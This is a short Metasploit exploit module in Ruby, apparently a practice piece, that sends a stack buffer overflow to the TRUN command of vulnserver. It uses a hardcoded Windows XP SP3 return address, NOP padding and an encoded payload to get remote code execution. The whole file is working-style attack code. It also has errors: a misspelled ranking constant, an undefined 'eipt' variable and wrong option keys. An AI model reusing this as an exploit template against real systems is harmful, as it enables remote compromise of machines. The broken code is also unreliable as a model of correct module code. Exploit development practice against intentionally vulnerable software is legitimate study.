require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	rank = AvergeRanking
	
	include Msf::Exploit::Remote::Tcp

	def initialize(info={})
		super(update_info(info, 'Name' => 'Vulnerable Server BDF', 
			'Description' => %q {
				This module exploit stack based buffer overflow attack in vulnserver.
			},
			'Author' => 'Self',
			'Version' => '$Revision 1$',
			'Platforms' => 'win',
			'Payload' => 
			{
				'BadChars' => '\xc3\x04\x08'
			},
			 'Targets' =>
			         [
			         	['Windows XP SP3', {'Ret' => 0x625011af,}],
			         ]
			 ))
	end

	def exploit
		connect
		header = "TRUN /.:/"
		junk   = make_nops(2003)
		eip    = [target.ret].pack('V')
		nops   = make_nops(20)

		sploit = header + junk + eipt + nops + payload.encoded

		print_status("Trying #{target_name}..")
		sock.put(sploit)
		handler
		disconnect
	end
end